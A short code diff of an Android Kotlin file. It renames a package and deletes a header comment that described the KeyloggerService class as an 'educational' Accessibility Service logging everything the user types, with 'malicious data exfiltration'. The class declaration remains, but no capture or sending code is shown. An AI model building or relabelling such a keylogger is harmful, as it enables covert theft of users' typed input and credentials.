@@ -1,4 +1,4 @@
-package com.teacherapp.services
+package com.example.teacherapp.services
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
@@ -16,14 +16,6 @@ import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.*
 
-/**
- * KeyloggerService - Educational Accessibility Service
- *
- * Demonstrates how malicious apps can capture user input through
- * Accessibility Services. This logs all text typed by the user.
- *
- * Part 2: Malicious Data Exfiltration
- */
 class KeyloggerService : AccessibilityService() {
 
     private val TAG = "Keylogger"
